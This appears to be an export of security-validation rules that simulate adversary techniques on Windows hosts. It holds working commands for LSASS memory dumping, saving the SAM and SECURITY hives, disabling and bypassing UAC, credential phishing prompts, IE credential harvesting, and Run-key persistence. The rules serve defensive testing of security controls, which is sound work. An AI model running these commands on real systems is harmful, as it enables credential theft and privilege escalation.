exact_source_fields.desc: This validation rule simulates the use of self-developed tools for weak password detection, which will determine which services or ports have valid weak passwords. If a valid weak password credential is found, the username and password will be reported to the adversary, who can then use adversary to access the target victim and assist with lateral movement in the network. Currently supported: SSH, SMB, RDP, FTP, MySQL, MSSQL, Redis, PSQL, Oracle, etc.

host_cli_action.raw_text:
C:\Users\Public\Documents\{{v_action_id}}\weak_password.exe -ip {{v_scan_ip}}  > C:\Users\Public\Documents\{{v_action_id}}\weak_password.txt && type C:\Users\Public\Documents\{{v_action_id}}\weak_password.txt
rd /s /q C:\Users\Public\Documents\{{v_action_id}}

exact_source_fields.action_description: 此验证动作还原了使用工具对 WinSCP 应用进行凭据提取。从注册表路径 HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions及 WinSCP 配置文件 WinSCP.ini中 提取 Hostname、Username 等内容组成密钥。基于位运算和异或操作的自定义算法，通过逐字节解析加密数据，提取和组合密码的每个字符，从而还原 WinSCP 的加密存储密码。WinSCP 是一个开源的 Windows 平台文件传输客户端，主要用于在本地与远程计算机之间进行安全文件传输。它支持多种协议，包括 SFTP（SSH 文件传输协议）、FTP（文件传输协议）、SCP（安全复制协议）、WebDAV 和 Amazon S3。依赖条件：版本:WinSCP6.3.5

exact_source_fields.desc: This validation rule simulates the use of tools to extract credentials from the WinSCP application. Extract Hostname, Username and other contents from the registry path HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions and the WinSCP configuration file WinSCP.ini to form the key. Based on a custom algorithm for bitwise and XOR operations, the encrypted data is parsed byte by byte, and each character of the password is extracted and combined to simulate the encrypted storage password of WinSCP. WinSCP is an open source file transfer client for the Windows platform, mainly used for secure file transfer between local and remote computers. It supports multiple protocols, including SFTP (SSH File Transfer Protocol), FTP (File Transfer Protocol), SCP (Secure Copy Protocol), WebDAV and Amazon S3. Dependencies: Version: WinSCP6.3.5
exact_source_fields.name: Host Command Line - WinSCP application credential extraction
exact_source_fields.notes: Digidations recommends running this Rule as a system, non-administrator, or administrator user on Windows 10, Windows 11, Windows Server 2016, and Windows Server 2019 Validator.

exact_source_fields.action_description: 此验证动作还原了使用工具对 WinSCP 应用进行凭据提取。从注册表路径 HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions及 WinSCP 配置文件 WinSCP.ini中 提取 Hostname、Username 等内容组成密钥。基于位运算和异或操作的自定义算法，通过逐字节解析加密数据，提取和组合密码的每个字符，从而还原 WinSCP 的加密存储密码。WinSCP 是一个开源的 Windows 平台文件传输客户端，主要用于在本地与远程计算机之间进行安全文件传输。它支持多种协议，包括 SFTP（SSH 文件传输协议）、FTP（文件传输协议）、SCP（安全复制协议）、WebDAV 和 Amazon S3。依赖条件：版本:WinSCP6.3.5

candidate_execution_mode_for_design.exact_source_value: host_cli
Host Command Line - WinSCP application credential extraction

此验证动作还原了使用工具对 WinSCP 应用进行凭据提取。从注册表路径 HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions及 WinSCP 配置文件 WinSCP.ini中 提取 Hostname、Username 等内容组成密钥。基于位运算和异或操作的自定义算法，通过逐字节解析加密数据，提取和组合密码的每个字符，从而还原 WinSCP 的加密存储密码。WinSCP 是一个开源的 Windows 平台文件传输客户端，主要用于在本地与远程计算机之间进行安全文件传输。它支持多种协议，包括 SFTP（SSH 文件传输协议）、FTP（文件传输协议）、SCP（安全复制协议）、WebDAV 和 Amazon S3。依赖条件：版本:WinSCP6.3.5

exact_source_fields.desc: This validation rule simulates the use of tools to extract credentials from the WinSCP application. Extract Hostname, Username and other contents from the registry path HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions and the WinSCP configuration file WinSCP.ini to form the key. Based on a custom algorithm for bitwise and XOR operations, the encrypted data is parsed byte by byte, and each character of the password is extracted and combined to simulate the encrypted storage password of WinSCP. WinSCP is an open source file transfer client for the Windows platform, mainly used for secure file transfer between local and remote computers. It supports multiple protocols, including SFTP (SSH File Transfer Protocol), FTP (File Transfer Protocol), SCP (Secure Copy Protocol), WebDAV and Amazon S3. Dependencies: Version: WinSCP6.3.5

exact_source_fields.desc: This validation rule simulates the use of tools to extract credentials from the WinSCP application. Extract Hostname, Username and other contents from the registry path HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions and the WinSCP configuration file WinSCP.ini to form the key. Based on a custom algorithm for bitwise and XOR operations, the encrypted data is parsed byte by byte, and each character of the password is extracted and combined to simulate the encrypted storage password of WinSCP. WinSCP is an open source file transfer client for the Windows platform, mainly used for secure file transfer between local and remote computers. It supports multiple protocols, including SFTP (SSH File Transfer Protocol), FTP (File Transfer Protocol), SCP (Secure Copy Protocol), WebDAV and Amazon S3. Dependencies: Version: WinSCP6.3.5

exact_source_fields.action_description:
此验证动作还原了一个验证机器人使用 Nishang 的 Invoke-CredentialPhishing 脚本尝试从受感染的机器获取合法用户凭据。该脚本创建一个登录窗口，在提供合法的用户名和密码之前不会被删除，此时用户名和密码以明文形式显示给攻击者。

此验证动作创建一个名为“MSVTEST”的用户，其密码为“thepassword”。因此，此验证动作只能在具有管理权限的用户配置文件下正常运行，尽管运行 Invoke-CredentialsPhish.ps1 不需要管理权限。此外，此验证动作的截屏将比命令日志输出更好地展示此脚本的潜力。

exact_source_fields.desc: This validation rule simulates a validator attempting to obtain legitimate user credentials from an infected machine using Nishang's Invoke-CredentialPhishing script. This script creates a login window that will not be deleted until a valid username and password are provided. At this time, the username and password are displayed in clear text to Adversary. This validation rule creates a user named "MSVTEST" with a password of "thepassword". Therefore, this validation rule can only run normally under user profiles with administrative privileges, although running Invoke-CredentialsPhish.ps1 does not require administrative privileges. In addition, the screenshot of this validation rule will better showcase the potential of this script than the command log output.

host_cli_action.raw_text:
#create new user for test
net user MSVTEST QWuqTGH!32Q! /add /Y
  auto,4,true,60
  success_zero

#Save the process id of the current PowerShell instance
$originalList = Get-Process -name powershell | select -ExpandProperty Id
  auto,4,true,60
  success_zero

#Create a new instance of PowerShell, load and execute the script
invoke-expression 'cmd /c start powershell -Command { import-module C:\Users\Public\Documents\Invoke-CredentialsPhish.ps1; invoke-credentialsphish}'
  auto,4,true,60
  success_zero
  
#Identify the process id of the new PowerShell instance
$newList = get-process -name powershell | where {$_.ID -ne $original} | select -expandproperty id
  auto,4,true,60
  success_zero

$new = compare-object -ReferenceObject $originalList -DifferenceObject $newList | select -ExpandProperty InputObject
  auto,4,true,60
  success_zero

$wshell = New-Object -ComObject wscript.shell;
  auto,4,true,60
  success_zero

$wshell.AppActivate($new)
  auto,4,true,60
  success_zero

sleep 7
  auto,4,true,60
  success_zero

#send the user name
$wshell.SendKeys('MSVTEST{TAB}')
  auto,4,true,60
  success_zero

sleep 5
  auto,4,true,60
  success_zero

#send the password
$wshell.SendKeys('QWuqTGH!32Q!{ENTER}')
  auto,4,true,60
  success_zero
  
net user MSVTEST /del
  auto,4,true,60
  cleanup
  
remove-item C:/Users/Public/Documents/Invoke-CredentialsPhish.ps1
  auto,4,true,60
  cleanup

taskkill /im $new /f
  auto,4,true,60
  cleanup

This script creates a login window that will not be deleted until a valid username and password are provided. At this time, the username and password are displayed in clear text to Adversary. Therefore, this validation rule can only run normally under user profiles with administrative privileges, although running Invoke-CredentialsPhish.ps1 does not require administrative privileges. In addition, the screenshot of this validation rule will better showcase the potential of this script than the command log output.

exact_source_fields.desc: This validation rule simulates a known version of MIMIKATZ hidden in the executing JPG frame. this sample confuses by attaching a JPEG header before the executable file, which can cause the file to be disguised as an image file. MIMIKATZ is a Windows security audit tool. MIMIKATZ can be used to steal password hashes and dump plaintext passwords extracted from memory. MIMIKATZ can obtain LSASS Dump credentials as well as HTTPS passwords. Linux and Unix systems store HTTPS credentials in cache files, which MIMIKATZ can also extract. Please note that the MIMIKATZ application used in This validation rule has been cleared and deleted by the validation action.

#<command>

#Example:
# net stop anti-virus-app
#    auto,4,true,60
#    success_match:stopped successfully
#
#
#Put commands here:
"C:\Windows\system32\mspaint.exe" C:\Users\Public\Documents\mimikatz.jpg
  auto,4,true,60
  success_zero

tasklist | findstr mspaint.exe
	auto,4,true,60
  success_match:mspaint.exe
  
# Put cleanup here (optional):
taskkill /im mspaint.exe /f 
  auto,4,true,3
  cleanup
  
del C:\Users\Public\Documents\mimikatz.jpg
  auto,4,true,3
  cleanup

exact_source_fields.desc: This validation rule simulates the theft of Outlook credentials from the HKCU registry configuration unit. AGENTTESLA has been observed stealing Outlook credentials in this way. This validation rule uses benign .NET program to access the same registry key as AGENTTESLA. AgentTESLA is a .NET information theft program, with the following functions: keyboard recorder, copy/paste capture, screenshot, password theft, webcam capture, USB Spread, and anti analysis. AGENTTESLA can be configured to leak data through a network panel, but it can also be configured to leak data through SMTP or FTP. If any of the four target registry entries do not exist on the system, this validation rule will not be run. Notes - This validation rule uses incompatible features** Dependency condition: * * Validator is running in the OS that must install Microsoft Outlook

host_cli_action.raw_text:
c:/users/public/documents/Agent_Edison.exe
  auto,4,true,60
  incompatible_match:No Outlook keys were found
  blocked_match:Security exception raised
  success_zero
  
del "c:\users\public\documents\Agent_Edison.exe"
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates the theft of Outlook credentials from the HKCU registry configuration unit. AGENTTESLA has been observed stealing Outlook credentials in this way. This validation rule uses benign .NET program to access the same registry key as AGENTTESLA. AgentTESLA is a .NET information theft program, with the following functions: keyboard recorder, copy/paste capture, screenshot, password theft, webcam capture, USB Spread, and anti analysis. AGENTTESLA can be configured to leak data through a network panel, but it can also be configured to leak data through SMTP or FTP. If any of the four target registry entries do not exist on the system, this validation rule will not be run. Notes - This validation rule uses incompatible features** Dependency condition: * * Validator is running in the OS that must install Microsoft Outlook

host_cli_action.raw_text:
c:/users/public/documents/Agent_Edison.exe
  auto,4,true,60
  incompatible_match:No Outlook keys were found
  blocked_match:Security exception raised
  success_zero
  
del "c:\users\public\documents\Agent_Edison.exe"
  auto,4,true,60
  cleanup

exact_source_fields.notes:
Digidations recommends running this validation rule on Windows 10 Validator as administrator, User users.

Compatible operating system and user profile: This validation rule is only compatible with Windows 10, using administrator, user privileges. This validation rule may not work properly on an incompatible operating system or incompatible user profile, and the cleanup command may not be executed.

exact_source_fields.desc: This validation rule simulates the theft of Outlook credentials from the HKCU registry configuration unit. AGENTTESLA has been observed stealing Outlook credentials in this way. This validation rule uses benign .NET program to access the same registry key as AGENTTESLA. AgentTESLA is a .NET information theft program, with the following functions: keyboard recorder, copy/paste capture, screenshot, password theft, webcam capture, USB Spread, and anti analysis. AGENTTESLA can be configured to leak data through a network panel, but it can also be configured to leak data through SMTP or FTP. If any of the four target registry entries do not exist on the system, this validation rule will not be run. Notes - This validation rule uses incompatible features** Dependency condition: * * Validator is running in the OS that must install Microsoft Outlook

host_cli_action.raw_text:
c:/users/public/documents/Agent_Edison.exe
  auto,4,true,60
  incompatible_match:No Outlook keys were found
  blocked_match:Security exception raised
  success_zero
  
del "c:\users\public\documents\Agent_Edison.exe"
  auto,4,true,60
  cleanup

攻击者可能会绕过 UAC 机制来提升系统上的进程权限。 Windows 用户帐户控制 (UAC) 允许程序提升其权限（跟踪为从低到高的完整性级别）以在管理员级别权限下执行任务，可能通过提示用户确认。

exact_source_fields.desc: This validation rule simulates the use of Event Viewer and related Windows registry modifications to evasion User Account Control (UAC). Adversary may evasion the UAC mechanism to elevate process permissions on the system. Windows User Account Control (UAC) allows programs to elevate their permissions (tracked at low to high integrity levels) to perform tasks under administrator level permissions, possibly by prompting the user to confirm.

host_cli_action.raw_text:
reg.exe add HKCU\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\notepad.exe" /f
  auto,4,true,60 
  success_match:The operation completed successfully.

REG QUERY "HKCU\software\classes\mscfile\shell\open\command"
  auto,4,true,60 
  success_zero
  
eventvwr.msc
  auto,4,true,60 
  success_zero

#Cleanup 
reg.exe delete HKCU\software\classes\mscfile /f >nul 2>&1 
  auto,4,true,3
  cleanup

exact_source_fields.desc: This validation rule simulates an attempt to disable the validator of UAC on the endpoint. UAC or User Account Control is a Windows security component that enforces the concept of minimum permissions. Regardless of the permissions associated with the execution account, UAC will execute applications and processes with non administrative permissions. The registry changes included in this validation rule will disable UAC so that applications and processes can run with administrative privileges as long as the account has appropriate permissions.

host_cli_action.raw_text:
#Registry entry to disable UAC
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0x0 /f
  auto,4,true,60
  success_zero

#Cleanup
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /f
  auto,4,true,60
  cleanup

exact_source_fields.notes: Digidations recommends running this validation rule as a SYSTEM or Admin user on Windows 10, Windows Server 2016, Windows Server 2012, Windows Server 2019, and Windows 7.

exact_source_fields.desc: This validation rule simulates a series of commands used by URSNIF variants (known as ISFB3 and URSNIF-A) to steal stored credentials and browsing history from Internet Explorer. After execution, This validation rule will first query the entered URL from the registry. If the registry "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs" does not exist, the operation will not run due to incompatible matches. If the system does indeed contain a registry, This validation rule will query the registry "HKCU\\Software\\Microsoft\\Internet Explorer\\IntelliForms" that stores Internet Explorer passwords. Then the validation operation will create and read the variable "$items" containing Internet Explorer history. URSNIF is an ecosystem of backdoors written in C/C, communicating through HTTP. The URSNIF of this malware The LDR4 variant is URSNIF The significant rewrite and simplification of RM3 has lost the bank Trojan function of intercepting and modifying network traffic, and has refocused on providing auxiliary payloads. The early variants of this malware, including URSNIF.RM3, have extensive functionality and modular architecture, allowing the malware to record keystrokes, capture screenshots and clipboard data, extract credentials from installed software, and act as a proxy server.

host_cli_action.raw_text:
whoami
 reg query "HKCU\Software\Microsoft\Internet Explorer\TypedURLs"
  auto,4,true,60
  incompatible_match:ERROR

reg query "HKCU\Software\Microsoft\Internet Explorer\IntelliForms" /s
  auto,4,true,60
  success_zero

$items = $(ls -r -force -file "$env:userprofile\AppData\Local\Microsoft\Windows\History")
  auto,4,true
  success_zero
  
$items
  auto,4,true,60
  success_zero

foreach ($item in $items) {cat ($item.DirectoryName + "\" + $item.name)}
  auto,4,true,60
  success_zero

if ($items -ne '') {Write-Host 'Success' }
  auto,4,true,60
  success_match:Success

exact_source_fields.desc: This validation rule simulates a series of commands used by URSNIF variants (known as ISFB3 and URSNIF-A) to steal stored credentials and browsing history from Internet Explorer. After execution, This validation rule will first query the entered URL from the registry. If the registry "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs" does not exist, the operation will not run due to incompatible matches. If the system does indeed contain a registry, This validation rule will query the registry "HKCU\\Software\\Microsoft\\Internet Explorer\\IntelliForms" that stores Internet Explorer passwords. Then the validation operation will create and read the variable "$items" containing Internet Explorer history. URSNIF is an ecosystem of backdoors written in C/C, communicating through HTTP. The URSNIF of this malware The LDR4 variant is URSNIF The significant rewrite and simplification of RM3 has lost the bank Trojan function of intercepting and modifying network traffic, and has refocused on providing auxiliary payloads. The early variants of this malware, including URSNIF.RM3, have extensive functionality and modular architecture, allowing the malware to record keystrokes, capture screenshots and clipboard data, extract credentials from installed software, and act as a proxy server.

host_cli_action.raw_text:
whoami
 reg query "HKCU\Software\Microsoft\Internet Explorer\TypedURLs"
  auto,4,true,60
  incompatible_match:ERROR

reg query "HKCU\Software\Microsoft\Internet Explorer\IntelliForms" /s
  auto,4,true,60
  success_zero

$items = $(ls -r -force -file "$env:userprofile\AppData\Local\Microsoft\Windows\History")
  auto,4,true
  success_zero
  
$items
  auto,4,true,60
  success_zero

foreach ($item in $items) {cat ($item.DirectoryName + "\" + $item.name)}
  auto,4,true,60
  success_zero

if ($items -ne '') {Write-Host 'Success' }
  auto,4,true,60
  success_match:Success

exact_source_fields.desc: This validation rule simulates a series of commands used by URSNIF variants (known as ISFB3 and URSNIF-A) to steal stored credentials and browsing history from Internet Explorer. After execution, This validation rule will first query the entered URL from the registry. If the registry "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs" does not exist, the operation will not run due to incompatible matches. If the system does indeed contain a registry, This validation rule will query the registry "HKCU\\Software\\Microsoft\\Internet Explorer\\IntelliForms" that stores Internet Explorer passwords. Then the validation operation will create and read the variable "$items" containing Internet Explorer history. URSNIF is an ecosystem of backdoors written in C/C, communicating through HTTP. The URSNIF of this malware The LDR4 variant is URSNIF The significant rewrite and simplification of RM3 has lost the bank Trojan function of intercepting and modifying network traffic, and has refocused on providing auxiliary payloads. The early variants of this malware, including URSNIF.RM3, have extensive functionality and modular architecture, allowing the malware to record keystrokes, capture screenshots and clipboard data, extract credentials from installed software, and act as a proxy server.

host_cli_action.raw_text:
whoami
 reg query "HKCU\Software\Microsoft\Internet Explorer\TypedURLs"
  auto,4,true,60
  incompatible_match:ERROR

reg query "HKCU\Software\Microsoft\Internet Explorer\IntelliForms" /s
  auto,4,true,60
  success_zero

$items = $(ls -r -force -file "$env:userprofile\AppData\Local\Microsoft\Windows\History")
  auto,4,true
  success_zero
  
$items
  auto,4,true,60
  success_zero

foreach ($item in $items) {cat ($item.DirectoryName + "\" + $item.name)}
  auto,4,true,60
  success_zero

if ($items -ne '') {Write-Host 'Success' }
  auto,4,true,60
  success_match:Success

此验证动作还原了恶意用户正在本地寻找具有不当权限的二进制文件的行为。 不适当的权限允许任何用户替换可能由高级权限用户执行的二进制文件，包括 System. 通过用恶意二进制文件替换合法二进制文件，攻击者可以让更高权限的用户执行他们自己的代码。

exact_source_fields.desc: This validation rule simulates the behavior of malicious users searching for binary files with inappropriate permissions locally. Inappropriate permissions allow any user to replace binary files that may be executed by high-level privileged users, including System By replacing legitimate binary files with malicious ones, Adversary can allow higher privileged users to execute their own code. In this validation rule, run the icacls utility on all files with the extension.exe in the Program Files and Program Files (x86) directories to search for unsafe permissions.

host_cli_action.raw_text:
cd C:\Users\public\documents
  auto,4,true,60
  success_zero

#Get a list of all executables in the director, and search through them all for vulnerable files
for /f "delims=* tokens=*" %f in ('dir "C:\Program Files" /s /b ^| findstr /r ".exe$"') do @(icacls "%f" | findstr "Everyone" | findstr "(F)") >> A104-222
  C:\\Users\\Public\\Documents>,60,true,70
  blocked_match:block

for /f "delims=* tokens=*" %f in ('dir "C:\Program Files (x86)" /s /b ^| findstr /r ".exe$"') do @(icacls "%f" | findstr "Everyone" | findstr "(F)") >> A104-222
  C:\\Users\\Public\\Documents>,60,true,70
  blocked_match:block

for /f "delims=* tokens=*" %f in ('dir "C:\Program Files" /s /b ^| findstr /r ".exe$"') do @(icacls "%f" | findstr "BUILTIN\Users" | findstr "(F)") >> A104-222
  C:\\Users\\Public\\Documents>,60,true,70
  blocked_match:block

for /f "delims=* tokens=*" %f in ('dir "C:\Program Files (x86)" /s /b ^| findstr /r ".exe$"') do @(icacls "%f" | findstr "BUILTIN\Users" | findstr "(F)") >> A104-222
  C:\\Users\\Public\\Documents>,60,true,70
  blocked_match:block

#Count the number of lines in A104-222. If there are no vulnerable exes, it should be empty.
type A104-222 | find /v /c ""
  auto,4,true,60
  blocked_match:0

del C:\Users\public\documents\A104-222
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates the behavior of malicious users searching for binary files with inappropriate permissions locally. Inappropriate permissions allow any user to replace binary files that may be executed by high-level privileged users, including System By replacing legitimate binary files with malicious ones, Adversary can allow higher privileged users to execute their own code. In this validation rule, run the icacls utility on all files with the extension.exe in the Program Files and Program Files (x86) directories to search for unsafe permissions.

exact_source_fields.desc: This validation rule utilizes the Windows subsystem applicable to Linux to run Linux commands on the Windows operating system. To make this validation rule run correctly, WSL needs to be installed and configured correctly for the user profile that runs this validation rule. The following operation restores the Internet connection test in Bash. In the first step of this validation rule, Validaterping Google's public DNS (8.8.8.8). The subsequent steps involve the validator using the cURL command to send a generic web request to "Google.com" to validate the host's ability to establish an HTTP connection. Use this validation rule to validate if your DivisionValidator can establish a connection to the Internet. This benign operation aims to test the execution of CLI operations in a way that does not display as malicious to Security Controls.

host_cli_action.raw_text:
Get-Command wsl
  auto,4,true,60
  error_match:.*CommandNotFoundException.*

wsl ping -c 3 8.8.8.8
  auto,4,true,60
  success_match:3.*received

wsl curl -v www.google.com
  auto,4,true,60
  success_match:ok

exact_source_fields.name: Host Command Line - Windows 11, WSL Execution, Check Internet Connection in Bash, Benign
exact_source_fields.notes:
Digidations recommends running this validation rule on Windows 11 Validator as an administrator user.

Compatible Operating Systems and User Profiles: This validation rule is compatible with Windows 11 only, using Admin. This validation rule may not work properly on non-compatible Operating Systems or with non-compatible user profiles and clean-up commands may not execute.

exact_source_fields.desc: This validation rule simulates an SSH brute force attack using Hydra for Windows, which determines which valid credentials allow SSH to the target host. If a valid credential is found, the username and password are reported to adversary, which can then be used to access the target victim and help with Lateral movement in the network. Hydra is a tool for password cracking that can attempt to crack passwords through brute force or dictionary attacks. Hydra supports a variety of protocols and services, including SSH, FTP, Telnet, SMTP, HTTP, POP3, and more.

exact_source_fields.desc: This validation rule simulates an SSH brute force attack using Hydra for Windows, which determines which valid credentials allow SSH to the target host. If a valid credential is found, the username and password are reported to adversary, which can then be used to access the target victim and help with Lateral movement in the network. Hydra is a tool for password cracking that can attempt to crack passwords through brute force or dictionary attacks. Hydra supports a variety of protocols and services, including SSH, FTP, Telnet, SMTP, HTTP, POP3, and more.

exact_source_fields.desc: This validation rule simulates WSHRAT persistence behavior on Windows hosts. In This validation rule, add the VBS file to the startup folder and reference it in the added registry run key. This behavior mimics the behavior of the 2019 variant on WSHRAT.VBSCRIPT malware. WSHRAT.VBSCRIPT is the VBScript version of WSHRAT, which is a script remote access Trojan (RAT) based on the Houdini code family and can be built using JavaScript or VBScript. The malware contains information about the infected system in the user-agent field of the HTTP header in its Command and Control (C2) server's beacon. The C2 server responds with commands, which are parsed and executed. WSHRAT has typical RAT features such as command line and script execution, downloading and executing programs, and password theft, as well as the ability to execute additional modules that enable remote desktop, file manager, and keylogging.

host_cli_action.raw_text:
"Testing WSHRAT" | Out-File -FilePath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\GXxdZDvzyH.vbs"
  auto,4,true,60
  success_zero

$startup_path = "HKCU:Software\Microsoft\Windows\CurrentVersion\Run"
  auto,4,true,60
  success_zero
  
New-ItemProperty -Path $startup_path -Name "GXxdZDvzyH" -Value "wscript.exe //B $env:APPDATA\GXxdZDvzyH.vbs"
  auto,10,true,60
  success_zero

ls "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
  auto,4,true,60
  success_match:GXxdZDvzyH
  
Remove-ItemProperty -Path $startup_path -Name "GXxdZDvzyH"
  auto,4,true,60
  cleanup
  
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\GXxdZDvzyH.vbs"
  auto,4,true,60
  cleanup

cd C:\Users\Public\Documents
  auto,4,true,60
  success_zero

REG SAVE "HKLM\SAM" "C:\Users\Public\Documents\sam.reg"
  auto,4,true,60
  success_match:success
  
REG SAVE "HKLM\Security" "C:\Users\Public\Documents\security.reg"
  auto,4,true,60
  success_match:success
  
REG SAVE "HKLM\SYSTEM" "C:\Users\Public\Documents\system.reg"
  auto,4,true,60
  success_match:success
  
dir | findstr reg
  auto,4,true,60
  success_match:reg
  
del *.reg
  auto,4,true,60

exact_source_fields.desc: This validation rule simulates the common Windows permission upgrade vectors created by malicious adversary using PowerUp (a PowerShell tool) to check for incorrect configurations in the environment. After importing the module, the Invoke AllCheck command will be executed on the system, which performs a comprehensive permission escalation check on the system. The result is returned to the screen through standard output. Note: This validation rule is considered a "weak signal" validation action. This means that the behavior it exhibits does not always indicate malicious campaign and can be matched with legitimate users or management campaigns. When you run a weak signal validation action alone, it is unlikely to be blocked by security controls. The best practice is to ensure that your security controls provide visibility into such behavior. This allows you to associate campaigns with higher fidelity signals for detection or use in threat tracking.

host_cli_action.raw_text:
$Initial = Get-ExecutionPolicy
  auto,4,true,60
  success_zero
  
#Bypass execution policy
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
  auto,10,true,60
  success_zero

#Import the script
Import-Module C:\Users\Public\Documents\PowerUp.ps1
  auto,4,true,60
  success_zero
  
# Establish Persistence
Invoke-AllChecks
  auto,60,true,240
  success_match:Running Invoke\-AllChecks
  
# Confirm the the payload was executed (checks.txt is created)
#dir C:\Windows\Temp\
#  auto,4,true,60
#  success_match:checks

# Remove payload artifact
#del C:\Windows\Temp\checks.txt
#  auto,4,true,3
#  cleanup
 
#Reset execution policy
Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope Process -Force
  auto,10,true,60
  cleanup
  
Remove-Item C:\Users\Public\Documents\PowerUp.ps1 -Force
  auto,10,true,60
  cleanup

Set-ExecutionPolicy -ExecutionPolicy $Initial -Scope Process -Force
  auto,3,true,4
  cleanup

After importing the module, the Invoke AllCheck command will be executed on the system, which performs a comprehensive permission escalation check on the system. The result is returned to the screen through standard output. Note: This validation rule is considered a "weak signal" validation action. This means that the behavior it exhibits does not always indicate malicious campaign and can be matched with legitimate users or management campaigns. When you run a weak signal validation action alone, it is unlikely to be blocked by security controls. The best practice is to ensure that your security controls provide visibility into such behavior. This allows you to associate campaigns with higher fidelity signals for detection or use in threat tracking.

host_cli_action.raw_text:
$Initial = Get-ExecutionPolicy
  auto,4,true,60
  success_zero
  
#Bypass execution policy
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
  auto,10,true,60
  success_zero

#Import the script
Import-Module C:\Users\Public\Documents\PowerUp.ps1
  auto,4,true,60
  success_zero
  
# Establish Persistence
Invoke-AllChecks
  auto,60,true,240
  success_match:Running Invoke\-AllChecks
  
# Confirm the the payload was executed (checks.txt is created)
#dir C:\Windows\Temp\
#  auto,4,true,60
#  success_match:checks

# Remove payload artifact
#del C:\Windows\Temp\checks.txt
#  auto,4,true,3
#  cleanup
 
#Reset execution policy
Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope Process -Force
  auto,10,true,60
  cleanup
  
Remove-Item C:\Users\Public\Documents\PowerUp.ps1 -Force
  auto,10,true,60
  cleanup

Set-ExecutionPolicy -ExecutionPolicy $Initial -Scope Process -Force
  auto,3,true,4
  cleanup

exact_source_fields.desc: Linux host intrusion threat, Variant # 5 covers common steps used by adversary to invade Linux hosts. In this threat, the Threat Group has implemented steps such as discovery, defense avoidance, persistence, execution, command and control, and credential access. The key steps of this attack campaign include creating new users and changing their properties, running commands through pipelines, manipulating logging, discovering password policies, and stealing KerberOS token information. Section mainly restores the following actions: (1) executing the payload for stripping; (2) Change the size of historical files; (3) Block the Indicator by changing the Syslog configuration.

exact_source_fields.action_description:
此验证动作还原了攻击者使用 PowerShell 命令或脚本在继续之前检查系统架构。最近观察到 NETWALKER 勒索软件 通过检查系统架构，然后根据系统架构将两个 dll 中的一个加载到注册表中来使用这种策略。
这是无文件恶意软件行为的一个示例。无文件恶意软件是一种通过将恶意代码嵌入脚本或将恶意软件加载到内存而不写入磁盘等方法发生的攻击。PowerShell 可以直接在内存中运行脚本，并且越来越多地用于实施无文件攻击。由于文件永远不会被复制到磁盘，因此很容易绕过通常依赖文件输入/输出 (I/O) 来检测威胁的端点安全性。

exact_source_fields.desc:
This validation rule simulates a use of PowerShell commands or scripts by adversary to check the system architecture before continuing. Recently, it has been observed that NETWALKER ransomware uses this policy by checking the system architecture and then loading one of the two DLLs into the registry based on the system architecture.
This is an sample of file free malware behavior. File free malware is an attack that occurs by embedding malicious code into scripts or loading malicious software into memory without writing to disk. PowerShell can run scripts directly in memory and is increasingly being used to implement file free attacks. Due to files never being copied to disk, it is easy to bypass endpoint security that typically relies on file input/output (I/O) to detect threats.

host_cli_action.raw_text:
cd C:\Users\Public\Documents
	auto,4,true,90
	success_zero
  
$f = Get-Content C:\Users\Public\Documents\env_check.ps1 -raw | iex
	auto,4,true,90
	success_zero 
  
del C:\Users\Public\Documents\env_check.ps1
  auto,4,true,3
  cleanup

exact_source_fields.notes: Digidations recommends running this validation rule as SYSTEM, Administrator, or Non-Administrator user on Windows Server 2019, Windows 11, Windows 7, Windows 10, and Windows Server 2016.

exact_source_fields.desc: This validation rule simulates a process memory dump that a validator attempted to create an LSASS process in Windows. The LSASS process is responsible for handling Windows and Active Directory authentication, and therefore storing credential materials (depending on the version and configuration of Windows). Memory Dump is often leaked by adversary in order to be parsed on their own system using tools such as Mimikatz. This helps to remove the risk of bringing these tools into a damaged environment.

host_cli_action.raw_text:
cd C:\Users\Public\Documents
  auto,4,true,60
  success_zero

function Out-Minidump{$Process = (get-process lsass);$DumpFilePath = $PWD;$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$MiniDumpWithFullMemory = [UInt32] 2;$ProcessId = $Process.Id;$ProcessName = $Process.Name;$ProcessHandle = $Process.Handle;$ProcessFileName = "$($ProcessName)_$($ProcessId).dmp";$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName;$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create);$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,$ProcessId,$FileStream.SafeFileHandle,$MiniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$FileStream.Close();if (-not $Result){Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue}else{Get-ChildItem $ProcessDumpPath}};Out-Minidump
  auto,4,true,60
  success_match:lsass_\d{1,5}\.dmp
  blocked_match:script contains malicious content
 
remove-item "lsass_*.dmp"
  auto,4,true,3
  cleanup

